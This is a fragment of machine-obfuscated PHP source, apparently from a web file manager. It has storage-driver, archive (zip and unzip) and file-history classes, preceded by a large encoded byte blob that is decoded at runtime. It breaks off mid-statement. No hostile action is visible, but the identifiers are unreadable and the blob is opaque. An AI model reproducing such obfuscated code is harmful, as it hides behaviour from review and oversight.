uİ6w-ó²i(´ÓªNÒn\'¨:üü1•LÏ%z!Ã\\')."\x6b\xce\x2\x59\x89\x20\xe6\x47\x9c\x14\x31\x3f\xd0\xf4\x7\xb8\x5\x31\xe3\x8a\x13\x9f\x14\xe6\x11\x53\x5e\xb7\x24\xd1\x69\x7b\x5b\xf9\x6e\xa1\x8b\x2\xff\xcf\x30\x5f\x70\xe9\x34\xab\x64"."\11\133\371\272\153\305\10\20\44\224\154\102\244\15\311\165\350\157\340\263\170\113\54\37\272\5\211\327\12\235\337\242\333\167\225\176\110\373\216\130\11\364\371\70\43\217\145".base64_decode('2QLWx9qm6hTcqsknZCSYMKSTl5k1d9vJwIDWQiRLAoxco224VS64ON6XiMYvUsw=')."\xc3\xb6\x89\x6f\xe5\x8a\x35\x25\x91\x94\xff\xc1\x4\x32\x19\x85\x8a\x33\xc2\xe4\xa3\x4a\xcf\xfd\x4b\x18\xdd\xa8\xf2\x3c\xa0\x74\x6e\xfe\x19\xed\xa6\xdc\x15\x97\xc7\xbc\xaa\xed\x95\x10\x52"."\x52\xd3\x69\x76\x84\x4c\x30\x70\x1f\x42\x3c\x74\xf6\xd5\x55\x3d\x2a\x26\xea\x18\xf0\x28\x93\x65\xaa\x64\xb1\xa4\x57\x4\x85\x3f\x26\x89\xb9\xc2\xa5\xd9\xf5\xbf\x49\xa4\x6b\x46\x9c\xe4\xf7"."\21\355\234\20\37\350\12\165\254\126\311\317\254\174\37\212\124\44\57\203\312\252\245\327\347\204\302\205\150\150\240\23\260\206\211\233\111\162\17\56\320\311\357\306\251\222\231"."\16\36\117\351\205\120\103\16\73\57\236\107\230\147\117\364\75\207\74\207\342\355\256\107\144\11\35\162\277\54\313\6\205\54\176\101\327\244\113\226\16\341\201\277\355\345\20"."\46\54\367\263\173\210\245\222\175\356\242\50\107\173\330\100\201\0\22\353\150\372\65\151\177\24\133\241\10\115\366\44\274\363\275\170\307\135\124\354\111\310\265\326\331\15\127".strrev('"ÀäÛœ?WU*¦\\y/[#Œ¹0\'mñÛZ˜sróÕÿîg~¿ş½ŒÃJ›õ&jõË')."\xfe\xea\xb2\x14\xe7\x26\x9f\xcc\x9b\x14\x73\x32\xa5\xb2\x63\x18\x35\x9f\x77\x9f\x49\x56\x88\x5\x15\xcf\x75\x22\xe4\x1b\xe2\x4f\x47\x56\x8b\x38\xfd\x27\x27\xe4\x37\x96\xab\xc8\xb0\x8c\xdb".base64_decode('LFYeGuLhDjvdDUtcQUU2QaAQ88D8avlZKIXlJMw6MrooX5eMlJhEVQ+keGAJox8=')."\344\2\66\220\21\231\164\70\100\25\4\47\356\30\104\7\120\36\37\361\334\74\177\342\332\121\242\333\365\20\41\315\144\311\243\351\320\135\127\236\41\127\226\346\13\127\56".base64_decode('gk1jnWoe/oR0g/tN6UZv5ceoZTrWNESxbM+0NeR4gxw/VilDES0m8kyC6tUXHH8=')."\x0\x52\xa8\xae\x70\x48\xee\x2f\x5b\xb8\xbd\xa6\x41\x38\x30\x27\x94\xeb\x3b\x24\x4b\x44\xe9\x3d\xe3\x8a\x67\x48\x5d\xc7\x4\x48\x1c\x12\xe7\x66\xba\x41\x7c\x8d\x43\xb7\x63\x7d\xdd\x75\xe4"."\262\5\140\52\342\346\73\14\361\256\174\241\104\25\150\362\46\312\156\71\111\106\301\0\162\250\271\54\371\361\6\147\111\154\346\355\134\51\213\253\145\113\31\246\45\145\343".base64_decode('8Gp5Mf7IYrychl+BtR0jLZzDu53CE7GYSroOgRcOMGWQdL6HeN+085UJkkjAzJk=')."\x23\xd4\x20\x9d\x50\x39\xf\x8\xb9\xd3\xec\xa\x32\x56\xd6\xc3\x52\x32\x29\xc5\x7c\x84\xa1\x5f\x7c\x13\x2c\x24\xdc\xf\x90\x64\xaa\x7b\xf\x48\x4f\xd\xbb\x4b\x39\x5f\x92\x96\x8e\x13\x53"."\x4\xaf\x82\x95\x27\x46\xe2\x20\x4b\x62\x2\x58\x31\x2c\x98\x8\xfa\xec\x82\x4b\x9b\x80\xa0\x84\xea\x88\xe0\x59\x4\x6b\x9c\x4e\xf3\x57\xcb\x1d\x59\xd3\x4c\x38\xe0\x50\x4\x11\xf\x9c\x63"."\236\107\272\150\52\354\222\265\121\367\133\263\76\371\162\252\43\143\45\124\134\104\225\312\213\63\5\321\115\14\253\326\175\262\234\234\305\345\213\256\34\251\4\210\276\23\300"."\xd\x6d\x24\x31\x4\xdb\xda\xb\xb\x1c\xda\x15\x2e\x53\x8b\x4f\x3a\xaf\xd5\xf2\x6c\x7c\xce\x50\x1e\x72\xb3\xc1\xeb\x80\xba\x4\x2b\xac\xa1\x60\xdb\xb9\x2b\xc9\x92\x1f\x64\x77\x9e\x12\xca".strrev('	‘-OqÍ•È1ŞB/ƒ3#l	Gİ,C+#ıV ZN Ÿ\'U,>Z„¾B')."\x4\xfa\x52\x60\x81\x68\x35\x69\x5a\xc0\x99\x44\xf3\x6b\xae\xd6\xcb\x5\xdc\x3d\xa3\x25\xac\x51\xdd\x4e\xe5\x24\x41\xa5\x32\xb1\x12\x6e\x56\xc\x2a\x7c\xa8\x7a\x7b\xdd\xad\x62\x63\xea\x16"."\xdf\x44\x25\x15\xed\x91\xcc\x10\xe2\x46\x95\x32\xb4\x45\x55\x8b\xd1\x24\x5c\x52\xf0\x92\x8e\xb2\x93\xc\x1\x2e\x4b\x93\x70\xd9\x8a\x64\x56\x58\xd2\x76\x48\xe5\x6c\xb5\x6c\x4d\xd2\xbd\xca"."\xc1\x3\x15\x40\xba\x4a\x87\x5d\x82\x32\xcd\x3a\xd9\x78\x56\xcd\x5c\xf9\x39\xc0\x38\x77\x6e\xa2\x33\xa8\xde\xa\x21\xea\xbb\x8e\x83\xab\xb5\xa2\x6a\xe6\x49\x5b\x21\x72\xbb\x76\x81\x6a\xb4".base64_decode('lqVUoa7CLqCSjou0KlYKtE68R8v+iaokyyYP1Y0iolWXvuW0VnDB5YFhlktIcss=').base64_decode('60PCZotZAU9zkPRycaho8G0iLezLsL0qf2Wef66iNidqFsuSo86qRskeLGdXSrQ=').strrev('ÓÈXv€¡9X¨«Ö;õ!1Š\\çi/$}4DÏe@ŞœÒ¶Ã*nk%Íi•y')."\375\37\64\357\364\350\255\15\37\361\362\103\27\342\256\222\356\227\64\71\146\230\266\7\247\305\215\22\371\155\65\154\133\34\105\123\131\232\60\171\170\323\363\110\26\25\50"."\44\116\130\360\50\22\245\77\101\107\102\66\110\20\16\1\261\220\32\323\150\52\41\66\216\10\76\114\340\21\171\117\203\303\300\216\262\353\270\122\0\220\110\231\64\306\230"."\x33\x40\x7c\x2b\x57\xb4\x47\x3c\x4e\x4f\x98\x37\xc1\x77\x0\x8e\xc9\x36\x21\xe4\xbe\xb3\xe5\xa7\x29\x7e\x70\x22\xef\x55\x31\x3\x8\x6f\x52\xf9\x6\x4b\x59\x47\x71\xfa\xb2\xf\xb7\x73\xfc".base64_decode('rBpAWSmqoB6kiUoJu1mnDhQrknoDsdjKSLSdOpyuSCalJBubiqTerkjPZGnB7kA=').base64_decode('KFyRhs1xehLCQxRNCvWSVgbC4cjKyVoRalsmWkJOVYUOvJQzmGqbnRHE1DyTraU=').base64_decode('i3paQbgKE2WKempIaNRUiSm3mBc9HnC+3uKyemNIChVhU5oeqDtaAih2wM0XNGc=')."\220\305\61\261\317\161\234\54\301\311\172\40\124\104\302\71\171\3\45\200\351\125\7\110\326\237\126\352\363\111\252\30\0\334\260\245\6\330\141\15\32\111\111\137\117\305\23"."\xb8\x2c\x7\x43\x2a\x99\x4b\xd1\x30\x24\xff\x6f\x2d\xc1\xc2\x21\xd2\xa7\x0\x0", 10, -8))); goto fâæõ•‡…; c¨ØÑ¬‹İ‡: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ªüşèç) { $this->pathParse = $ªüşèç; } protected function infoParse($®Î¥‚ï¿, $ïÒÚ·¦è = false) { $âş†İ =& $_SERVER[Ôó‡è­ƒ]; return Action($âş†İ[1173])->sharePathInfo($this->pathParse[$âş†İ[78]], !0, $ïÒÚ·¦è); } public function listPath($çê‘úìë, $ìßø©àù = false) { $åÔùÅŠ =& $_SERVER[Ôó‡è­ƒ]; $‚šĞ´¶Ç = IO::listPath($çê‘úìë, $ìßø©àù); if (!$‚šĞ´¶Ç) { return $‚šĞ´¶Ç; } if (is_array($‚šĞ´¶Ç[$åÔùÅŠ[1334]])) { $‘ò°†” = Action($åÔùÅŠ[1344])->parsePathChildren($‚šĞ´¶Ç[$åÔùÅŠ[1334]], array($åÔùÅŠ[418] => $çê‘úìë)); $‚šĞ´¶Ç[$åÔùÅŠ[1334]] = Action($åÔùÅŠ[1173])->shareItemInfo($‘ò°†”); } foreach ($‚šĞ´¶Ç as $·şû«Òï => $ò°İºä) { if (!in_array($·şû«Òï, array($åÔùÅŠ[76], $åÔùÅŠ[77]))) { continue; } foreach ($ò°İºä as $Åë¯—Æ¹ => $‘ò°†”) { $‘ò°†” = Action($åÔùÅŠ[1344])->parsePathChildren($‘ò°†”, array($åÔùÅŠ[418] => $çê‘úìë)); $‚šĞ´¶Ç[$·şû«Òï][$Åë¯—Æ¹] = Action($åÔùÅŠ[1173])->shareItemInfo($‘ò°†”); } } return $‚šĞ´¶Ç; } public function listAll($Ó°ÕêÈğ) { $œ®ÒÚ¸ =& $_SERVER[Ôó‡è­ƒ]; $¬üÆå–ƒ = IO::listAll($Ó°ÕêÈğ); foreach ($¬üÆå–ƒ as &$áÖëäœ) { $íÎŞœ‡ = IO::info($áÖëäœ[$œ®ÒÚ¸[78]]); $íÎŞœ‡ = is_array($íÎŞœ‡) ? $íÎŞœ‡ : array(); $áÖëäœ = array_merge($íÎŞœ‡, $áÖëäœ); $áÖëäœ[$œ®ÒÚ¸[87]] = Action($œ®ÒÚ¸[1173])->shareItemInfo($áÖëäœ); } unset($áÖëäœ); return $¬üÆå–ƒ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($ùÁƒÇêƒ) { parent::__construct($ùÁƒÇêƒ); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($šâ®“«) { parent::__construct($šâ®“«); $this->signatureVersion($_SERVER[Ôó‡è­ƒ][215]); } public function uploadFormData($ĞÄ¿‹Ì, $ÁıÓÛ¬À = 3600) { $øŒç¨Æ™ =& $_SERVER[Ôó‡è­ƒ]; $‡µŒ»±ó = $øŒç¨Æ™[195]; $‰ŠÍ¶Ş¬ = $øŒç¨Æ™[1345]; $àÚ‡®¿½ = $øŒç¨Æ™[62]; $û‡ÕŒ  = gmdate($øŒç¨Æ™[1346]); $¹•ßˆÉÂ = gmdate($øŒç¨Æ™[749]); $ˆêù›ÀŞ = $øŒç¨Æ™[1347]; $€´¶üøİ = $ÁıÓÛ¬À . $øŒç¨Æ™[12]; $‡†Üê³ = $øŒç¨Æ™[1308]; $¸Ù¡Ø = array($this->accessKey, $¹•ßˆÉÂ, $this->region, $àÚ‡®¿½, $ˆêù›ÀŞ); $‘½‡¬Ä‚ = implode($øŒç¨Æ™[8], $¸Ù¡Ø); $à¶ÈÚş = array($øŒç¨Æ™[1310] => gmdate($øŒç¨Æ™[1309], strtotime($øŒç¨Æ™[1348])), $øŒç¨Æ™[1311] => array(array($øŒç¨Æ™[1313] => $this->bucket), array($øŒç¨Æ™[1312] => $‡µŒ»±ó), array($øŒç¨Æ™[1314], $øŒç¨Æ™[1315], $øŒç¨Æ™[12]), array($øŒç¨Æ™[1314], $øŒç¨Æ™[1349], $øŒç¨Æ™[12]), array($øŒç¨Æ™[1314], $øŒç¨Æ™[1350], $øŒç¨Æ™[12]), array($øŒç¨Æ™[1316] => $‡†Üê³), array($øŒç¨Æ™[1351] => $‘½‡¬Ä‚), array($øŒç¨Æ™[1352] => $‰ŠÍ¶Ş¬), array($øŒç¨Æ™[1353] => $û‡ÕŒ ), array($øŒç¨Æ™[1354] => $€´¶üøİ))); $Æñ®Î½ú = base64_encode(json_encode($à¶ÈÚş)); $°¨”¿ˆ = hash_hmac($øŒç¨Æ™[1355], $¹•ßˆÉÂ, $øŒç¨Æ™[1356] . $this->secret, !0); $Æ£úê™ú = hash_hmac($øŒç¨Æ™[1355], $this->region, $°¨”¿ˆ, !0); $Ã¶ôÃüæ = hash_hmac($øŒç¨Æ™[1355], $àÚ‡®¿½, $Æ£úê™ú, !0); $¦»ÀÓƒñ = hash_hmac($øŒç¨Æ™[1355], $ˆêù›ÀŞ, $Ã¶ôÃüæ, !0); $×Œœôôê = hash_hmac($øŒç¨Æ™[1355], $Æñ®Î½ú, $¦»ÀÓƒñ); $Ò¦ğÔĞ§ = array($øŒç¨Æ™[214] => $øŒç¨Æ™[12], $øŒç¨Æ™[1357] => $øŒç¨Æ™[12], $øŒç¨Æ™[1312] => $‡µŒ»±ó, $øŒç¨Æ™[1316] => $‡†Üê³, $øŒç¨Æ™[1320] => $Æñ®Î½ú, $øŒç¨Æ™[1358] => $‘½‡¬Ä‚, $øŒç¨Æ™[1359] => $‰ŠÍ¶Ş¬, $øŒç¨Æ™[1360] => $û‡ÕŒ , $øŒç¨Æ™[1361] => $€´¶üøİ, $øŒç¨Æ™[1362] => $×Œœôôê, $øŒç¨Æ™[178] => $this->getHost()); return $Ò¦ğÔĞ§; } } goto C•±ÜŸ›Åš; D—ÁŞ·‚¦: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ï×‘Ë; if (!$ï×‘Ë) { $âÑ—ºŞ´ = IO::init($_SERVER[Ôó‡è­ƒ][8]); } return $âÑ—ºŞ´; } private static function iconvSystem($–•®ó¬) { return self::local()->iconvSystem($–•®ó¬); } private static function iconvApp($¼Î¬‰¯¡) { return self::local()->iconvApp($¼Î¬‰¯¡); } public static function zip($Ä¨¾¡¨ô, $óîÂ÷ö» = "\x7a\151\160", $¸ò†’“é = '', $†ó›Ğ–ş = REPEAT_RENAME) { $…şè¡– =& $_SERVER[Ôó‡è­ƒ]; $±Â³Ø¤• = self::init($Ä¨¾¡¨ô[0][$…şè¡–[78]]); $Æ©ªÉ‚˜ = self::info($Ä¨¾¡¨ô[0][$…şè¡–[78]]); $¡¹ãœ¾â = !1; if (!$¸ò†’“é && $±Â³Ø¤•->getType() == $…şè¡–[107]) { $“äÎŠ¹ = self::zipFileList($Ä¨¾¡¨ô); } else { $¡¹ãœ¾â = $¸ò†’“é ? $¸ò†’“é : TEMP_FILES . $…şè¡–[1182] . time() . rand_string(8) . $…şè¡–[8]; mk_dir($¡¹ãœ¾â); $“äÎŠ¹ = self::zipFileList($Ä¨¾¡¨ô, $¡¹ãœ¾â); } $òô½·ùç = $Æ©ªÉ‚˜[$…şè¡–[32]]; if (count($“äÎŠ¹) > 1) { $‚¼Äƒ‡ö = IO::info(IO::pathFather($Æ©ªÉ‚˜[$…şè¡–[78]])); $òô½·ùç = $‚¼Äƒ‡ö[$…şè¡–[32]]; } $²ƒ¾‡¼ = $¡¹ãœ¾â; if (!$²ƒ¾‡¼) { $²ƒ¾‡¼ = get_path_father($Æ©ªÉ‚˜[$…şè¡–[78]]); if (!$¸ò†’“é && $±Â³Ø¤•->getType() == $…şè¡–[107]) { $²ƒ¾‡¼ = get_path_father($±Â³Ø¤•->path); } $ŸÖòüÅÏ = IO::info($²ƒ¾‡¼); if (!$ŸÖòüÅÏ[$…şè¡–[199]]) { show_json(LNG($…şè¡–[1183]), !1); } } $Éåƒ‰ÎÅ = $²ƒ¾‡¼ . $òô½·ùç . $…şè¡–[10] . $óîÂ÷ö»; $Éåƒ‰ÎÅ = get_filename_auto($Éåƒ‰ÎÅ, $…şè¡–[12], $†ó›Ğ–ş); $ŠİóÁùã = self::iconvSystem($Éåƒ‰ÎÅ); foreach ($“äÎŠ¹ as $èŸ çº» => $¼‘ä•“) { $“äÎŠ¹[$èŸ çº»] = self::iconvSystem($¼‘ä•“); } KodArchive::create($ŠİóÁùã, $“äÎŠ¹); if (!IO::exist($Éåƒ‰ÎÅ)) { if ($¡¹ãœ¾â) { del_dir($¡¹ãœ¾â); } show_json(LNG($…şè¡–[1184]), !1); } if ($¸ò†’“é || !$¡¹ãœ¾â) { if ($¡¹ãœ¾â && strstr($¡¹ãœ¾â, TEMP_FILES)) { $õÖ›¨ãİ = $“äÎŠ¹ = array(); recursion_dir($²ƒ¾‡¼, $õÖ›¨ãİ, $“äÎŠ¹, 0); foreach ($õÖ›¨ãİ as $•ëÙ¦Î) { del_dir($•ëÙ¦Î); } foreach ($“äÎŠ¹ as $­‰ûŒ„) { if ($­‰ûŒ„ == $ŠİóÁùã) { continue; } del_file($­‰ûŒ„); } } return $Éåƒ‰ÎÅ; } $¡„ÚÎ‰ú = self::pathFather($Æ©ªÉ‚˜[$…şè¡–[78]]); $ıñŒÛüÆ = self::move($Éåƒ‰ÎÅ, $¡„ÚÎ‰ú, $†ó›Ğ–ş); if (!$ıñŒÛüÆ) { del_dir($¡¹ãœ¾â); show_json(LNG($…şè¡–[1184]), !1); } del_dir($¡¹ãœ¾â); return $ıñŒÛüÆ; } public static function unzip($¸ Æß¹Ş, $Š š¬Â§ = "\162\x65\160\154\x61\x63\145") { $¹‹»ãæ =& $_SERVER[Ôó‡è­ƒ]; $÷’®¬ÅÔ = $¸ Æß¹Ş[$¹‹»ãæ[78]]; $ö§îÎªÛ = $¸ Æß¹Ş[$¹‹»ãæ[1185]]; if (!($ŒÃØÂòÌ = parent::info($÷’®¬ÅÔ))) { show_json(LNG($¹‹»ãæ[1186]), !1); } if (!($şğ‡¤ï = parent::infoFull($ö§îÎªÛ))) { $ö§îÎªÛ = parent::mkdir($ö§îÎªÛ); $şğ‡¤ï = array($¹‹»ãæ[78] => $ö§îÎªÛ); } else { if (isset($şğ‡¤ï[$¹‹»ãæ[399]]) && trim($şğ‡¤ï[$¹‹»ãæ[78]], $¹‹»ãæ[8]) != trim($ö§îÎªÛ, $¹‹»ãæ[8])) { $°¡ˆ¶Ÿ· = KodIO::make($şğ‡¤ï[$¹‹»ãæ[494]]); $˜’«‰·Ì = parent::fileNameAuto($°¡ˆ¶Ÿ·, $şğ‡¤ï[$¹‹»ãæ[32]], REPEAT_RENAME_FOLDER, !0); $ö§îÎªÛ = parent::mkdir($°¡ˆ¶Ÿ· . $˜’«‰·Ì); $şğ‡¤ï = array($¹‹»ãæ[78] => $ö§îÎªÛ); } } $ö§îÎªÛ = $şğ‡¤ï[$¹‹»ãæ[78]]; $ÉèÔÉëá = self::tmpFileName($ŒÃØÂòÌ); $±é„È½à = TEMP_FILES . $ÉèÔÉëá; del_dir($±é„È½à); mk_dir($±é„È½à); $Æ›ĞÊ Ë = self::fileExt($ŒÃØÂòÌ); $©Ğ‘ó“È = $±é„È½à . $¹‹»ãæ[10] . $Æ›ĞÊ Ë; if (!@file_exists(self::iconvSystem($©Ğ‘ó“È))) { $Ñç§ÚÖÓ = self::localFilePath($÷’®¬ÅÔ, $Æ›ĞÊ Ë); $©Ğ‘ó“È = $Ñç§ÚÖÓ ? $Ñç§ÚÖÓ : parent::download($÷’®¬ÅÔ, $©Ğ‘ó“È); } $©Ğ‘ó“È = self::iconvSystem($©Ğ‘ó“È); $Š³Ã´ïØ = isset($¸ Æß¹Ş[$¹‹»ãæ[1187]]) ? $¸ Æß¹Ş[$¹‹»ãæ[1187]] : $¹‹»ãæ[1188]; $£çšÉîˆ = KodArchive::extract($©Ğ‘ó“È, $±é„È½à . $¹‹»ãæ[8], $Š³Ã´ïØ); self::archiveExt(); if (!$£çšÉîˆ[$¹‹»ãæ[1189]]) { show_json($¹‹»ãæ[1190] . $£çšÉîˆ[$¹‹»ãæ[1191]], !1); } Hook::trigger($¹‹»ãæ[1192], $±é„È½à); recursion_dir($±é„È½à, $á•¹©®Õ, $¬úÓ§É, 0); $Ô‡ùòÍÂ = array_merge($á•¹©®Õ, $¬úÓ§É); foreach ($Ô‡ùòÍÂ as $†šµ›ÓÛ) { $†šµ›ÓÛ = self::iconvApp($†šµ›ÓÛ); self::move($†šµ›ÓÛ, $ö§îÎªÛ, $Š š¬Â§); } del_dir($±é„È½à); if (!$Ñç§ÚÖÓ) { del_file($©Ğ‘ó“È); } return !0; } public static function unzipList($Ïªß¥šÏ) { $¿¸ áÄ =& $_SERVER[Ôó‡è­ƒ]; $èçÌ¢„² = $Ïªß¥šÏ[$¿¸ áÄ[78]]; $îæ©²¥Ô = isset($Ïªß¥šÏ[$¿¸ áÄ[1193]]) ? $Ïªß¥šÏ[$¿¸ áÄ[1193]] : -1; $ˆ×‡— = 50000; if (request_url_safe($èçÌ¢„²)) { $½…‡Ô± = parse_url_query($èçÌ¢„²); if (!isset($½…‡Ô±[$¿¸ áÄ[78]])) { show_json($¿¸ áÄ[1194], !1); } } $ÓÓ½ÉæÛ = isset($½…‡Ô±) ? $½…‡Ô±[$¿¸ áÄ[78]] : $èçÌ¢„²; $­Ã¨Ç² = self::info($ÓÓ½ÉæÛ); $İŠÜŸ‰ = self::fileExt($­Ã¨Ç²); $•¾¹ÀŸË = self::tmpFileName($­Ã¨Ç²); if (isset($½…‡Ô±)) { $é‹¨˜÷˜ = array($½…‡Ô±[$¿¸ áÄ[78]], $½…‡Ô±[$¿¸ áÄ[1193]], $½…‡Ô±[$¿¸ áÄ[32]]); $ô§î³œ = md5(implode($¿¸ áÄ[11], $é‹¨˜÷˜)) . $¿¸ áÄ[10] . get_path_ext($½…‡Ô±[$¿¸ áÄ[32]]); } else { $é‹¨˜÷˜ = array($­Ã¨Ç²[$¿¸ áÄ[32]], $­Ã¨Ç²[$¿¸ áÄ[78]], $­Ã¨Ç²[$¿¸ áÄ[80]]); $ô§î³œ = md5(implode($¿¸ áÄ[11], $é‹¨˜÷˜)) . $¿¸ áÄ[10] . $İŠÜŸ‰; } if ($îæ©²¥Ô == -1) { $»È—ìÓ’ = IO_PATH_SYSTEM_TEMP . "\172\151\160\x56\151\x65\167\x2f{$•¾¹ÀŸË}\x2f{$ô§î³œ}\56\x6c\x6f\x67"; $ ÖÔîŞ‰ = self::infoFull($»È—ìÓ’); if ($ ÖÔîŞ‰) { $»È—ìÓ’ = $ ÖÔîŞ‰[$¿¸ áÄ[78]]; $Ãï÷» = self::getContent($»È—ìÓ’); if ($Ãï÷») { $À¦±×Áï = json_decode($Ãï÷», !0); $À¦±×Áï = is_array($À¦±×Áï) ? $À¦±×Áï : array(); if (count($À¦±×Áï) >= $ˆ×‡—) { show_json(sprintf(LNG($¿¸ áÄ[1195]), count($À¦±×Áï)), !1); } return $À¦±×Áï; } } else { $»È—ìÓ’ = self::mkfile($»È—ìÓ’); } } $—…èŒ­š = TEMP_FILES . $•¾¹ÀŸË; if (!is_dir($—…èŒ­š)) { mk_dir($—…èŒ­š); } $œùØ‚áê = $—…èŒ­š . $¿¸ áÄ[8] . $ô§î³œ; if (!@file_exists(self::iconvSystem($œùØ‚áê))) { if (isset($½…‡Ô±)) { url_request($èçÌ¢„², $¿¸ áÄ[1196], $œùØ‚áê); } else { $ĞüŒî‚¸ = self::localFilePath($èçÌ¢„², $İŠÜŸ‰); $œùØ‚áê = $ĞüŒî‚¸ ? $ĞüŒî‚¸ : self::download($èçÌ¢„², $œùØ‚áê); } } $œùØ‚áê = self::iconvSystem($œùØ‚áê); if ($îæ©²¥Ô >= 0) { $†…ñšë» = isset($Ïªß¥šÏ[$¿¸ áÄ[1197]]) ? $Ïªß¥šÏ[$¿¸ áÄ[1197]] : !1; $âÁ³€Öå = isset($Ïªß¥šÏ[$¿¸ áÄ[32]]) ? $Ïªß¥šÏ[$¿¸ áÄ[32]] : $¿¸ áÄ[12]; KodArchive::filePreview($œùØ‚áê, $îæ©²¥Ô, $†…ñšë», $âÁ³€Öå); self::archiveExt(); die; } $¾Ìú¨± = KodArchive::listContent($œùØ‚áê); self::archiveExt(); del_dir($—…èŒ­š); if (!$¾Ìú¨±[$¿¸ áÄ[1189]]) { show_json($¾Ìú¨±[$¿¸ áÄ[1191]], !1); } $À¦±×Áï = json_encode($¾Ìú¨±[$¿¸ áÄ[1191]]); self::setContent($»È—ìÓ’, $À¦±×Áï); if (count($¾Ìú¨±[$¿¸ áÄ[1191]]) >= $ˆ×‡—) { show_json(sprintf(LNG($¿¸ áÄ[1195]), count($¾Ìú¨±[$¿¸ áÄ[1191]])), !1); } return $¾Ìú¨±[$¿¸ áÄ[1191]]; } private static function fileExt($®•ëùóé) { $±â½óòí =& $_SERVER[Ôó‡è­ƒ]; $Šóİ„Û = $®•ëùóé[$±â½óòí[171]]; if ($Šóİ„Û == $±â½óòí[1198]) { $âŠŠÔô = $±â½óòí[1199]; if (substr($®•ëùóé[$±â½óòí[32]], -strlen($âŠŠÔô)) == $âŠŠÔô) { $Šóİ„Û = $±â½óòí[1200]; } } self::archiveExt($Šóİ„Û); return $Šóİ„Û; } private static function zipFileList($¯­üë÷â, $Îôû¨µù = false) { $·ùº’½û =& $_SERVER[Ôó‡è­ƒ]; $º¢‡®é” = array(); foreach ($¯­üë÷â as $Ì¤•Á´õ) { $ªò½’«Ô = $Ì¤•Á´õ[$·ùº’½û[78]]; if ($Îôû¨µù) { $ªò½’«Ô = self::copy($Ì¤•Á´õ[$·ùº’½û[78]], $Îôû¨µù, $·ùº’½û[816]); } else { $¨’ èÒå = self::init($Ì¤•Á´õ[$·ùº’½û[78]]); if ($¨’ èÒå->getType() == $·ùº’½û[107]) { $ªò½’«Ô = $¨’ èÒå->path; } } if ($ªò½’«Ô && self::local()->exist($ªò½’«Ô)) { $º¢‡®é”[$Ì¤•Á´õ[$·ùº’½û[78]]] = $ªò½’«Ô; } } if (!empty($º¢‡®é”)) { return array_values($º¢‡®é”); } show_json(LNG($·ùº’½û[1164]), !1); } public static function tmpFileName($¹‚…£‘®) { $¦µˆˆÌ =& $_SERVER[Ôó‡è­ƒ]; $€àÊÈ™· = array($¹‚…£‘®[$¦µˆˆÌ[32]], $¹‚…£‘®[$¦µˆˆÌ[78]], $¹‚…£‘®[$¦µˆˆÌ[80]], $¹‚…£‘®[$¦µˆˆÌ[517]]); return md5(implode($¦µˆˆÌ[11], $€àÊÈ™·)); } private static function localFilePath($åÎ¨ıÜ, $ıÉÊÀ¾™) { $ˆÂİŞ =& $_SERVER[Ôó‡è­ƒ]; if ($ıÉÊÀ¾™ == $ˆÂİŞ[1201] && strtoupper(substr(PHP_OS, 0, 3)) == $ˆÂİŞ[1202]) { return !1; } $²®‰ŸŠè = KodIO::parse($åÎ¨ıÜ); if ($²®‰ŸŠè[$ˆÂİŞ[33]] == KodIO::KOD_SOURCE) { $¿ÎŒİ¿¶ = Model($ˆÂİŞ[823])->fileInfoGet(KodIO::sourceID($åÎ¨ıÜ)); if (!$¿ÎŒİ¿¶[$ˆÂİŞ[78]]) { show_json($ˆÂİŞ[1203], !1); } $åÎ¨ıÜ = $¿ÎŒİ¿¶[$ˆÂİŞ[78]]; } $›şšßì = self::init($åÎ¨ıÜ); if ($›şšßì->pathParse[$ˆÂİŞ[1151]]) { $åÎ¨ıÜ = $›şšßì->pathParse[$ˆÂİŞ[1151]]; $›şšßì = self::init($åÎ¨ıÜ); } $±´×ïÓø = $›şšßì->getType(); if ($±´×ïÓø == $ˆÂİŞ[107] || $±´×ïÓø == $ˆÂİŞ[1204]) { if (!$›şšßì->exist($›şšßì->path)) { show_json(LNG($ˆÂİŞ[106]), !1); } return $›şšßì->path; } return !1; } private static function archiveExt($¨†…»ôª = '') { $GLOBALS[$_SERVER[Ôó‡è­ƒ][1205]] = $¨†…»ôª; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $Ïˆ™È‡ =& $_SERVER[Ôó‡è­ƒ]; $«ôØ—úû = $GLOBALS[$Ïˆ™È‡[6]][$Ïˆ™È‡[90]]; if ($«ôØ—úû[$Ïˆ™È‡[1206]] != 1) { return; } if ($«ôØ—úû[$Ïˆ™È‡[1207]] <= 0) { return; } if (isset($_REQUEST[$Ïˆ™È‡[1208]]) && $_REQUEST[$Ïˆ™È‡[1208]] == $Ïˆ™È‡[89]) { return; } Hook::bind($Ïˆ™È‡[1209], $Ïˆ™È‡[1210]); Hook::bind($Ïˆ™È‡[1211], $Ïˆ™È‡[1212]); Hook::bind($Ïˆ™È‡[1213], $Ïˆ™È‡[1214]); Hook::bind($Ïˆ™È‡[1215], $Ïˆ™È‡[1216]); Hook::bind($Ïˆ™È‡[1217], $Ïˆ™È‡[1218]); Hook::bind($Ïˆ™È‡[1219], $Ïˆ™È‡[1220]); } public static function eventBeforeUpload($ÓÛÛäÚê) { if ($ÓÛÛäÚê[3] && $ÓÛÛäÚê[3] != REPEAT_REPLACE) { return; } $Ï¶–åõğ = self::parsePath($ÓÛÛäÚê[0]); if (!$Ï¶–åõğ) { return; } self::add($Ï¶–åõğ); } public static function eventBeforeEdit($Šòˆ¬Í) { $†Ù–®ù¶ = self::parsePath($Šòˆ¬Í[0]); if (!$†Ù–®ù¶) { return; } self::add($†Ù–®ù¶); } public static function eventBeforeCopyFile($—ğ‘™–É, $’÷Öâİñ, $É‚ÙÜÌ‚, $§­¼•°æ, $¥‡¾¾’©, $‡¼½Ó¡) { $©ŞîÌñ› = $É‚ÙÜÌ‚->getPathOuter($§­¼•°æ); $şñ¡î¤€ = self::parsePath($©ŞîÌñ›); if (!$şñ¡î¤€) { return; } self::add($şñ¡î¤€); } public static function eventBeforeRename($ÀÀ¢«ê) { $ƒìˆ ôş =& $_SERVER[Ôó‡è­ƒ]; $÷Ëèß…Í = self::parsePath($ÀÀ¢«ê[0]); if (!$÷Ëèß…Í) { return; } $—İó’’ = self::checkInHistory($÷Ëèß…Í); if (!$—İó’’) { return; } if ($—İó’’[$ƒìˆ ôş[33]] == $ƒìˆ ôş[196]) { $ê£‹¹Ö½ = self::listData($÷Ëèß…Í); if ($ê£‹¹Ö½ && 